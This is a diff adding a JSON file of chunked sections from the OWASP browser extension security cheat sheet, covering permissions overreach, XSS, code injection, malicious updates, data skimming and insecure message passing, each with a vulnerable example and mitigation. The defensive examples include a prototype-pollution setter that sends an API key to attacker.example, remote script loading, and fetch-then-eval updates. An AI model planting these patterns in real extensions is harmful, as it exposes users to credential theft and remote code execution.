@@ -1,0 +1,287 @@
+{
+ "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+ "title": "Browser Extension Security Vulnerabilities Cheat Sheet",
+ "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+ "chunks": [
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#001",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "1. Permissions Overreach > Vulnerability: Permissions Overreach",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#002",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "1. Permissions Overreach > Example: Permissions Overreach",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"permissions\": [\n    \"tabs\",\n    \"storage\"\n  ],\n  \"host_permissions\": [\n    \"http://*/*\",\n    \"https://*/*\"\n  ]\n}\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#003",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "1. Permissions Overreach > Mitigation: Permissions Overreach",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed. In Manifest V3, declare URL access separately in host_permissions or optional_host_permissions."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#004",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "2. Data Leakage > Vulnerability: Data Leakage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#005",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "2. Data Leakage > Example: Data Leakage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nchrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {\n  if (changeInfo.status === 'complete') {\n    fetch('http://example.com/track', {\n      method: 'POST',\n      body: JSON.stringify({ URL: tab.URL })\n    });\n  }\n});\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#006",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "2. Data Leakage > Mitigation: Data Leakage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#007",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "3. Cross-Site Scripting (XSS) > Vulnerability: Cross-Site Scripting (XSS)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#008",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "3. Cross-Site Scripting (XSS) > Example: Cross-Site Scripting (XSS)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nlet userInput = document.getElementById('input').value;\ndocument.getElementById('output').innerHTML = userInput; // No sanitization\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#009",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "3. Cross-Site Scripting (XSS) > Mitigation: Cross-Site Scripting (XSS)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#010",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "4. Insecure Communication > Vulnerability: Insecure Communication",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#011",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "4. Insecure Communication > Example: Insecure Communication",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nfetch('http://example.com/api/data');\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#012",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "4. Insecure Communication > Mitigation: Insecure Communication",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#013",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "5. Code Injection > Vulnerability: Code Injection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#014",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "5. Code Injection > Example: Code Injection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nlet script = document.createElement('script');\nscript.src = 'http://example.com/malicious.js';\ndocument.body.appendChild(script);\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#015",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "5. Code Injection > Mitigation: Code Injection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the CSP Cheat Sheet. Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#016",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "6. Malicious Updates > Vulnerability: Malicious Updates",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#017",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "6. Malicious Updates > Example: Malicious Updates",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nchrome.runtime.onInstalled.addListener(() => {\n  fetch('http://example.com/update-script.js')\n    .then(response => response.text())\n    .then(eval); // Unsafe!\n});\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#018",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "6. Malicious Updates > Mitigation: Malicious Updates",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace. See \"Don’t inject or incorporate remote scripts\". Implement integrity checks before executing any fetched code."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#019",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "7. Third-Party Dependencies > Vulnerability: Third-Party Dependencies",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#020",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "7. Third-Party Dependencies > Example: Third-Party Dependencies",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n{\n  \"dependencies\": {\n    \"vulnerable-lib\": \"1.0.0\"\n  }\n}\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#021",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "7. Third-Party Dependencies > Mitigation: Third-Party Dependencies",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#022",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "8. Lack of Content Security Policy (CSP) > Vulnerability: Lack of Content Security Policy (CSP)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Weakening an extension’s Content Security Policy (CSP) can increase the impact of script injection. Chrome enforces a default and minimum CSP for Manifest V3 extension pages, even when the manifest omits a custom policy."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#023",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "8. Lack of Content Security Policy (CSP) > Example: Restrictive Manifest V3 Policy",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"content_security_policy\": {\n    \"extension_pages\": \"default-src 'self'; script-src 'self'; object-src 'none';\"\n  }\n}\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#024",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "8. Lack of Content Security Policy (CSP) > Mitigation: Lack of Content Security Policy (CSP)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Configure content_security_policy.extension_pages in manifest.json and load scripts from the extension package. Do not apply ordinary webpage nonce or hash recommendations to Chrome Manifest V3 extension pages: their allowed script sources are restricted. Keep inline script execution blocked and restrict other resource types to those the extension needs."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#025",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "9. Insecure Storage > Vulnerability: Insecure Storage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#026",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "9. Insecure Storage > Example: Insecure Storage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\nlocalStorage.setItem('token', 'my-secret-token'); // No encryption\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#027",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "9. Insecure Storage > Mitigation: Insecure Storage",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Avoid persisting sensitive user data in the extension: extension storage is not encrypted. For sensitive data needed only while the browser is running, use chrome.storage.session, which stores data in memory and is not exposed to content scripts by default. Keep that access restriction and clear data when it is no longer needed. This reduces persistence and content-script exposure; it does not protect secrets from a compromised extension or device. Never hardcode API keys or credentials within the extension code."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#028",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "10. Insufficient Privacy Controls > Vulnerability: Insufficient Privacy Controls",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#029",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "10. Insufficient Privacy Controls > Example: Insufficient Privacy Controls",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"description\": \"A cool extension with no privacy policy.\"\n}\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#030",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "10. Insufficient Privacy Controls > Mitigation: Insufficient Privacy Controls",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#031",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "11. DOM-based Data Skimming > Vulnerability: DOM-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.\n\nThis risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.\n\nA malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#032",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "11. DOM-based Data Skimming > Example: DOM-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n// content-script.js\n\n// Sensitive data fetched from the extension's background service\nconst userData = {\n  name: \"Jane Doe\",\n  email: \"jane.doe@example.com\"\n};\n\n// This injects sensitive data directly into the page's DOM\nconst userInfoDiv = document.createElement('div');\nuserInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;\ndocument.body.appendChild(userInfoDiv);\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#033",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "11. DOM-based Data Skimming > Mitigation: DOM-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.\n\nUse secure alternatives such as:\n\nPopup: Display information in a popup UI that appears when the user clicks the extension's icon.\n\nOptions Page: Use a dedicated options page for displaying user-specific data or settings.\n\nSide Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, \"Side Panel\" is a Chromium term. Firefox calls it \"Sidebar\".)\n\nIt is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using openOrClosedShadowRoot() API.\n\nTherefore, using truly separate extension-controlled UIs is the most reliable mitigation."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#034",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "12. Prototype-based Data Skimming > Vulnerability: Prototype-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "An extension's content script is executed in \"isolated world\", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in \"main world\", a web page's context. For example, an extension can inject a <script> tag directly to DOM with src attribute pointing to a script of web accessible resources.\n\nWhen an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.\n\nThe reason why the data becomes accessible is because global objects of a context (sometimes called \"built-in objects\", \"primordials\" or \"prototypes\") can be overwritten to behave differently than usual. This is known as \"prototype pollution\", \"prototype overriding\" and so on.\n\nThis means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#035",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "12. Prototype-based Data Skimming > Example: Prototype-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n// Malicious script overwriting all objects' setter for 'apiKey'\n// to send the value to be set towards a server.\nObject.defineProperty(Object.prototype, 'apiKey', {\n    set: function (str) {\n        fetch(`https://attacker.example?data=${str}`);\n        Object.defineProperty(this, 'apiKey', {\n            value: str\n        })\n        return str\n    }\n})\n\n// Extension's script to be executed on a web page's context.\nwindow.addEventListener('message', (data) => {\n  if (data.apiKey) {\n    // the setter for 'apiKey' is already polluted,\n    // and the below line triggers malicious code and the data is immediately sent.\n    window.apiController.apiKey = data.apiKey;\n  }\n})\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#036",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "12. Prototype-based Data Skimming > Mitigation: Prototype-based Data Skimming",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use window.postMessage, because it can be overwritten also and malicious scripts can add listeners for message event.\n\nPlease note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.\n\nAlso, please don't assume your extension's script can use native prototypes even if it's executed at document_start timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at document_start (official bug issue)."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#037",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "13. Insecure Message Passing > Vulnerability: Insecure Message Passing",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Browser extensions often rely on message passing (chrome.runtime.sendMessage/onMessage) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys)."
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#038",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "13. Insecure Message Passing > Example: Insecure Message Passing",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "```\n// In Service Worker (Background)\nchrome.runtime.onMessage.addListener((request, sender, sendResponse) => {\n  if (request.action === 'fetchSecret') { // No validation of sender\n    // A malicious content script/webpage could trigger this.\n    fetch(SECRET_API_URL);\n  }\n});\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#039",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "13. Insecure Message Passing > Mitigation: Insecure Message Passing",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Treat all incoming messages as untrusted input. In Service Workers, always:\n\nValidate sender.id to ensure the message originates from your own extension.\n\nValidate sender.url or sender.origin to restrict which extension pages or content scripts may communicate.\n\nAvoid allowing webpages to indirectly influence privileged logic through content scripts.\n\nPerform strict validation and allow-listing of request.action and all request parameters.\n\nChrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:\n\n```\nchrome.runtime.onMessage.addListener((request, sender, sendResponse) => {\n  if (sender.id !== chrome.runtime.id) return;\n  if (!sender.url?.startsWith('chrome-extension://')) return;\n\n  if (request.action === 'fetchSecret') {\n    fetch(SECRET_API_URL);\n  }\n});\n```"
+  },
+  {
+   "chunk_id": "Browser_Extension_Vulnerabilities_Cheat_Sheet#040",
+   "doc": "Browser_Extension_Vulnerabilities_Cheat_Sheet",
+   "section": "References",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html",
+   "text": "Chrome Extensions: Stay Secure\n\nMDN: WebExtension Security Best Practices"
+  }
+ ]
+}
